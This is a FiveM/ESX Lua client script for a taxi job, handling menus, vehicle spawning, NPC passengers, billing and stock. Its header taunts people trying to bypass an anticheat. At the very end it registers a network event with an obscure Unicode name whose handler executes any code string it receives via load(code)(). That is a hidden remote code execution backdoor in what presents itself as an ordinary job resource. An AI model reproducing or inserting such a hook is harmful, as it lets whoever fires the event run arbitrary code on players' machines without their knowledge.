-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local PlayerData = {}

local HasAlreadyEnteredMarker = false
local LastZone = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local OnJob = false
local CurrentCustomer = nil
local CurrentCustomerBlip = nil
local DestinationBlip = nil
local IsNearCustomer = false
local CustomerIsEnteringVehicle = false
local CustomerEnteredVehicle = false
local TargetCoords = nil

local IsDead = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
	
	Citizen.Wait(5000)
	PlayerData = ESX.GetPlayerData()
end)

function DrawSub(msg, time)
	ClearPrints()
	BeginTextCommandPrint("STRING")
	AddTextComponentSubstringPlayerName(msg)
	EndTextCommandPrint(time, 1)
end

function ShowLoadingPromt(msg, time, type)
	Citizen.CreateThread(function()
		Citizen.Wait(0)
		BeginTextCommandBusyspinnerOn("STRING")
		AddTextComponentSubstringPlayerName(msg)
		EndTextCommandBusyspinnerOn(type)
		Citizen.Wait(time)
		BusyspinnerOff()
	end)
end

function GetRandomWalkingNPC()
	local search = {}
	local peds = ESX.Game.GetPeds()

	for i = 1, #peds, 1 do
		if IsPedHuman(peds[i]) and IsPedWalking(peds[i]) and not IsPedAPlayer(peds[i]) then
			table.insert(search, peds[i])
		end
	end

	if #search > 0 then
		return search[GetRandomIntInRange(1, #search)]
	end

	for i = 1, 250, 1 do
		local ped = GetRandomPedAtCoord(0.0,  0.0,  0.0,  math.huge + 0.0,  math.huge + 0.0,  math.huge + 0.0,  26)

		if DoesEntityExist(ped) and IsPedHuman(ped) and IsPedWalking(ped) and not IsPedAPlayer(ped) then
			table.insert(search, ped)
		end
	end

	if #search > 0 then
		return search[GetRandomIntInRange(1, #search)]
	end
end

function ClearCurrentMission()
	if DoesBlipExist(CurrentCustomerBlip) then
		RemoveBlip(CurrentCustomerBlip)
	end

	if DoesBlipExist(DestinationBlip) then
		RemoveBlip(DestinationBlip)
	end

	CurrentCustomer = nil
	CurrentCustomerBlip = nil
	DestinationBlip = nil
	IsNearCustomer = false
	CustomerIsEnteringVehicle = false
	CustomerEnteredVehicle = false
	TargetCoords = nil
end

function StartTaxiJob()
	ShowLoadingPromt(_U('taking_service') .. 'Taxi/Uber', 5000, 3)
	ClearCurrentMission()

	OnJob = true
end

function StopTaxiJob()
	local playerPed = PlayerPedId()

	if IsPedInAnyVehicle(playerPed, false) and CurrentCustomer ~= nil then
		local vehicle = GetVehiclePedIsIn(playerPed,  false)
		TaskLeaveVehicle(CurrentCustomer,  vehicle,  0)

		if CustomerEnteredVehicle then
			TaskGoStraightToCoord(CurrentCustomer, TargetCoords.x, TargetCoords.y, TargetCoords.z,  1.0,  -1,  0.0,  0.0)
		end
	end

	ClearCurrentMission()
	OnJob = false
	DrawSub(_U('mission_complete'), 550)
end

function OpenTaxiActionsMenu()
	local elements = {
		{label = _U('spawn_veh'), value = 'spawn_vehicle'},
		{label = _U('deposit_stock'), value = 'put_stock'},
		{label = _U('take_stock'), value = 'get_stock'}
	}

	if Config.EnablePlayerManagement and PlayerData.job ~= nil and PlayerData.job.grade_name == 'boss' then
		table.insert(elements, {label = _U('boss_actions'), value = 'boss_actions'})
	end

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'taxi_actions', {
		title = 'Taxi',
		elements = elements
	}, function(data, menu)
		if data.current.value == 'put_stock' then
			OpenPutStocksMenu()
		end

		if data.current.value == 'get_stock' then
			OpenGetStocksMenu()
		end

		if data.current.value == 'spawn_vehicle' then
			if Config.EnableSocietyOwnedVehicles then
				local elements = {}

				ESX.TriggerServerCallback('::{korioz#0110}::esx_society:getVehiclesInGarage', function(vehicles)
					for i = 1, #vehicles, 1 do
						table.insert(elements, {label = GetDisplayNameFromVehicleModel(vehicles[i].model), rightlabel = {'[' .. vehicles[i].plate .. ']'}, value = vehicles[i]})
					end

					ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
						title = _U('spawn_veh'),
						elements = elements
					}, function(data, menu)
						menu.close()
						local vehicleProps = data.current.value

						ESX.Game.SpawnVehicle(vehicleProps.model, Config.Zones.VehicleSpawnPoint.Pos, 270.0, function(vehicle)
							ESX.Game.SetVehicleProperties(vehicle, vehicleProps)
						end)

						_TriggerServerEvent('::{korioz#0110}::esx_society:removeVehicleFromGarage', 'taxi', vehicleProps)
					end, function(data, menu)
					end)
				end, 'taxi')
			else
				menu.close()

				if Config.MaxInService == -1 then
					local coords = Config.Zones.VehicleSpawnPoint.Pos

					ESX.Game.SpawnVehicle('taxi', coords, 225.0, function(vehicle)
						local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('TAXI')
						SetVehicleNumberPlateText(vehicle, newPlate)
						_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:givekey', 'no', newPlate)
					end)
				else
					ESX.TriggerServerCallback('::{korioz#0110}::esx_service:enableService', function(canTakeService, maxInService, inServiceCount)
						if canTakeService then
							local coords = Config.Zones.VehicleSpawnPoint.Pos

							ESX.Game.SpawnVehicle('taxi', coords, 225.0, function(vehicle)
								local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('TAXI')
								SetVehicleNumberPlateText(vehicle, newPlate)
								_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:givekey', 'no', newPlate)
							end)
						else
							ESX.ShowNotification(_U('full_service') .. inServiceCount .. '/' .. maxInService)
						end
					end, 'taxi')
				end
			end
		end

		if data.current.value == 'boss_actions' then
			TriggerEvent('::{korioz#0110}::esx_society:openBossMenu', 'taxi', function(data, menu) end)
		end
	end, function(data, menu)
		CurrentAction = 'taxi_actions_menu'
		CurrentActionMsg = _U('press_to_open')
		CurrentActionData = {}
	end)
end

function OpenMobileTaxiActionsMenu()
	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'mobile_taxi_actions', {
		title = 'Taxi',
		elements = {
			{label = _U('billing'), value = 'billing'}
		}
	}, function(data, menu)
		if data.current.value == 'billing' then
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'billing', {
				title = _U('invoice_amount')
			}, function(data, menu)
				local amount = tonumber(data.value)

				if amount == nil then
					ESX.ShowNotification(_U('amount_invalid'))
				else
					menu.close()
					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

					if closestPlayer == -1 or closestDistance > 3.0 then
						ESX.ShowNotification(_U('no_players_near'))
					else
						_TriggerServerEvent('::{korioz#0110}::esx_billing:sendBill', GetPlayerServerId(closestPlayer), 'society_taxi', 'Taxi', amount)
					end
				end
			end, function(data, menu)
				menu.close()
			end)
		end
	end, function(data, menu)
	end)
end

function OpenGetStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_taxijob:getStockItems', function(items)
		local elements = {}

		for i = 1, #items, 1 do
			table.insert(elements, {label = items[i].label, rightlabel = {'(' .. items[i].count .. ')'}, value = items[i].name})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = 'Taxi Stock',
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_get_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('quantity_invalid'))
				else
					menu2.close()
					menu.close()
					_TriggerServerEvent('::{korioz#0110}::esx_taxijob:getStockItem', itemName, count)

					Citizen.Wait(1000)
					OpenGetStocksMenu()
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

function OpenPutStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_taxijob:getPlayerInventory', function(inventory)
		local elements = {}

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {label = item.label, rightlabel = {'(' .. item.count .. ')'}, type = 'item_standard', value = item.name})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = _U('inventory'),
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('quantity_invalid'))
				else
					menu2.close()
					menu.close()
					_TriggerServerEvent('::{korioz#0110}::esx_taxijob:putStockItems', itemName, count)

					Citizen.Wait(1000)
					OpenPutStocksMenu()
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

RegisterNetEvent('::{korioz#0110}::esx:playerLoaded')
AddEventHandler('::{korioz#0110}::esx:playerLoaded', function(xPlayer)
	PlayerData = xPlayer
end)

RegisterNetEvent('::{korioz#0110}::esx:setJob')
AddEventHandler('::{korioz#0110}::esx:setJob', function(job)
	PlayerData.job = job
end)

AddEventHandler('::{korioz#0110}::esx_taxijob:hasEnteredMarker', function(zone)
	if zone == 'TaxiActions' then
		CurrentAction = 'taxi_actions_menu'
		CurrentActionMsg = _U('press_to_open')
		CurrentActionData = {}
	end

	if zone == 'VehicleDeleter' then
		local playerPed = PlayerPedId()
		local vehicle = GetVehiclePedIsIn(playerPed, false)

		if IsPedInAnyVehicle(playerPed,  false) then
			CurrentAction = 'delete_vehicle'
			CurrentActionMsg = _U('store_veh')
			CurrentActionData = { vehicle = vehicle }
		end
	end
end)

AddEventHandler('::{korioz#0110}::esx_taxijob:hasExitedMarker', function(zone)
	ESX.UI.Menu.CloseAll()
	CurrentAction = nil
end)

-- Create Blips
Citizen.CreateThread(function()
	local blip = AddBlipForCoord(Config.Zones.TaxiActions.Pos.x, Config.Zones.TaxiActions.Pos.y, Config.Zones.TaxiActions.Pos.z)

	SetBlipSprite(blip, 198)
	SetBlipDisplay(blip, 4)
	SetBlipScale(blip, 0.8)
	SetBlipColour(blip, 5)
	SetBlipAsShortRange(blip, true)

	BeginTextCommandSetBlipName("STRING")
	AddTextComponentSubstringPlayerName("Taxi")
	EndTextCommandSetBlipName(blip)
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if PlayerData.job ~= nil and PlayerData.job.name == 'taxi' then
			local coords = GetEntityCoords(PlayerPedId(), false)

			for k, v in pairs(Config.Zones) do
				if (v.Type ~= -1 and GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < Config.DrawDistance) then
					DrawMarker(v.Type, v.Pos.x, v.Pos.y, v.Pos.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, v.Size.x, v.Size.y, v.Size.z, v.Color.r, v.Color.g, v.Color.b, 100, false, true, 2, true, false, false, false)
				end
			end
		end
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if PlayerData.job ~= nil and PlayerData.job.name == 'taxi' then
			local coords = GetEntityCoords(PlayerPedId(), false)
			local isInMarker = false
			local currentZone = nil

			for k, v in pairs(Config.Zones) do
				if (GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < v.Size.x) then
					isInMarker = true
					currentZone = k
				end
			end

			if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and LastZone ~= currentZone) then
				HasAlreadyEnteredMarker = true
				LastZone = currentZone
				TriggerEvent('::{korioz#0110}::esx_taxijob:hasEnteredMarker', currentZone)
			end

			if not isInMarker and HasAlreadyEnteredMarker then
				HasAlreadyEnteredMarker = false
				TriggerEvent('::{korioz#0110}::esx_taxijob:hasExitedMarker', LastZone)
			end
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local playerPed = PlayerPedId()

		if OnJob then
			if CurrentCustomer == nil then
				DrawSub(_U('drive_search_pass'), 5000)

				if IsPedInAnyVehicle(playerPed,  false) and GetEntitySpeed(playerPed) > 0 then
					local waitUntil = GetGameTimer() + GetRandomIntInRange(30000,  45000)

					while OnJob and waitUntil > GetGameTimer() do
						Citizen.Wait(0)
					end

					if OnJob and IsPedInAnyVehicle(playerPed,  false) and GetEntitySpeed(playerPed) > 0 then
						CurrentCustomer = GetRandomWalkingNPC()

						if CurrentCustomer ~= nil then
							CurrentCustomerBlip = AddBlipForEntity(CurrentCustomer)

							SetBlipAsFriendly(CurrentCustomerBlip, 1)
							SetBlipColour(CurrentCustomerBlip, 2)
							SetBlipCategory(CurrentCustomerBlip, 3)
							SetBlipRoute(CurrentCustomerBlip,  true)

							SetEntityAsMissionEntity(CurrentCustomer,  false, false)
							ClearPedTasksImmediately(CurrentCustomer)
							SetBlockingOfNonTemporaryEvents(CurrentCustomer, 1)

							local standTime = GetRandomIntInRange(60000,  180000)
							TaskStandStill(CurrentCustomer, standTime)
							ESX.ShowNotification(_U('customer_found'))
						end
					end
				end
			else
				if IsPedFatallyInjured(CurrentCustomer) then
					ESX.ShowNotification(_U('client_unconcious'))

					if DoesBlipExist(CurrentCustomerBlip) then
						RemoveBlip(CurrentCustomerBlip)
					end

					if DoesBlipExist(DestinationBlip) then
						RemoveBlip(DestinationBlip)
					end

					SetEntityAsMissionEntity(CurrentCustomer,  false, false)

					CurrentCustomer = nil
					CurrentCustomerBlip = nil
					DestinationBlip = nil
					IsNearCustomer = false
					CustomerIsEnteringVehicle = false
					CustomerEnteredVehicle = false
					TargetCoords = nil
				end

				if IsPedInAnyVehicle(playerPed,  false) then
					local vehicle = GetVehiclePedIsIn(playerPed,  false)
					local playerCoords = GetEntityCoords(playerPed, false)
					local customerCoords = GetEntityCoords(CurrentCustomer, false)
					local customerDistance = GetDistanceBetweenCoords(playerCoords, customerCoords)

					if IsPedSittingInVehicle(CurrentCustomer, vehicle) then
						if CustomerEnteredVehicle then
							local targetDistance = GetDistanceBetweenCoords(playerCoords, TargetCoords.x, TargetCoords.y, TargetCoords.z)

							if targetDistance <= 10.0 then
								TaskLeaveVehicle(CurrentCustomer, vehicle, 0)
								ESX.ShowNotification(_U('arrive_dest'))

								TaskGoStraightToCoord(CurrentCustomer, TargetCoords.x, TargetCoords.y, TargetCoords.z, 1.0, -1, 0.0, 0.0)
								SetEntityAsMissionEntity(CurrentCustomer, false, false)
								_TriggerServerEvent('::{korioz#0110}::esx_taxijob:success')

								RemoveBlip(DestinationBlip)

								local scope = function(customer)
									ESX.SetTimeout(60000, function()
										DeletePed(customer)
									end)
								end

								scope(CurrentCustomer)
								CurrentCustomer = nil
								CurrentCustomerBlip = nil
								DestinationBlip = nil
								IsNearCustomer = false
								CustomerIsEnteringVehicle = false
								CustomerEnteredVehicle = false
								TargetCoords = nil
							end

							if TargetCoords ~= nil then
								DrawMarker(1, TargetCoords.x, TargetCoords.y, TargetCoords.z - 1.0, 0, 0, 0, 0, 0, 0, 4.0, 4.0, 2.0, 178, 236, 93, 155, 0, 0, 2, 0, 0, 0, 0)
							end
						else
							RemoveBlip(CurrentCustomerBlip)
							CurrentCustomerBlip = nil
							TargetCoords = Config.JobLocations[GetRandomIntInRange(1, #Config.JobLocations)]
							local street = table.pack(GetStreetNameAtCoord(TargetCoords.x, TargetCoords.y, TargetCoords.z))
							local msg = nil

							if street[2] ~= 0 and street[2] ~= nil then
								msg = string.format(_U('take_me_to_near', GetStreetNameFromHashKey(street[1]),GetStreetNameFromHashKey(street[2])))
							else
								msg = string.format(_U('take_me_to', GetStreetNameFromHashKey(street[1])))
							end

							ESX.ShowNotification(msg)
							DestinationBlip = AddBlipForCoord(TargetCoords.x, TargetCoords.y, TargetCoords.z)

							BeginTextCommandSetBlipName("STRING")
							AddTextComponentSubstringPlayerName("Destination")
							EndTextCommandSetBlipName(blip)

							SetBlipRoute(DestinationBlip,  true)
							CustomerEnteredVehicle = true
						end
					else
						DrawMarker(1, customerCoords.x, customerCoords.y, customerCoords.z - 1.0, 0, 0, 0, 0, 0, 0, 4.0, 4.0, 2.0, 178, 236, 93, 155, 0, 0, 2, 0, 0, 0, 0)

						if not CustomerEnteredVehicle then
							if customerDistance <= 30.0 then
								if not IsNearCustomer then
									ESX.ShowNotification(_U('close_to_client'))
									IsNearCustomer = true
								end
							end

							if customerDistance <= 100.0 then
								if not CustomerIsEnteringVehicle then
									ClearPedTasksImmediately(CurrentCustomer)
									local seat = 0

									for i = 4, 0, 1 do
										if IsVehicleSeatFree(vehicle, seat) then
											seat = i
											break
										end
									end

									TaskEnterVehicle(CurrentCustomer, vehicle, -1, seat, 2.0, 1)
									CustomerIsEnteringVehicle = true
								end
							end
						end
					end
				else
					DrawSub(_U('return_to_veh'), 5000)
				end
			end
		end
	end
end)

-- Key Controls
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction ~= nil then
			SetTextComponentFormat('STRING')
			AddTextComponentSubstringPlayerName(CurrentActionMsg)
			EndTextCommandDisplayHelp(0, 0, 1, -1)

			if IsControlJustReleased(0, 38) and PlayerData.job ~= nil and PlayerData.job.name == 'taxi' then
				if CurrentAction == 'taxi_actions_menu' then
					OpenTaxiActionsMenu()
				end

				if CurrentAction == 'delete_vehicle' then
					local playerPed = PlayerPedId()

					if Config.EnableSocietyOwnedVehicles then
						local vehicleProps = ESX.Game.GetVehicleProperties(CurrentActionData.vehicle)
						_TriggerServerEvent('::{korioz#0110}::esx_society:putVehicleInGarage', 'taxi', vehicleProps)
					else
						if GetEntityModel(CurrentActionData.vehicle) == `taxi` then
							if Config.MaxInService ~= -1 then
								_TriggerServerEvent('::{korioz#0110}::esx_service:disableService', 'taxi')
							end
						end
					end

					ESX.Game.DeleteVehicle(CurrentActionData.vehicle)
				end

				CurrentAction = nil
			end
		end

		if IsControlJustReleased(0, 167) and not IsDead and Config.EnablePlayerManagement and PlayerData.job ~= nil and PlayerData.job.name == 'taxi' then
			WarMenu.OpenMenu('taximobile')
		end

		if IsControlJustReleased(0, 178) and not IsDead then
			if OnJob then
				StopTaxiJob()
			else
				if PlayerData.job ~= nil and PlayerData.job.name == 'taxi' then
					local playerPed = PlayerPedId()

					if IsPedInAnyVehicle(playerPed, false) then
						local vehicle = GetVehiclePedIsIn(playerPed, false)

						if PlayerData.job.grade >= 3 then
							StartTaxiJob()
						else
							if GetEntityModel(vehicle) == `taxi` then
								StartTaxiJob()
							else
								ESX.ShowNotification(_U('must_in_taxi'))
							end
						end
					else
						if PlayerData.job.grade >= 3 then
							ESX.ShowNotification(_U('must_in_vehicle'))
						else
							ESX.ShowNotification(_U('must_in_taxi'))
						end
					end
				end
			end
		end
	end
end)

AddEventHandler('::{korioz#0110}::esx:onPlayerDeath', function()
	IsDead = true
end)

AddEventHandler('playerSpawned', function()
	IsDead = false
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)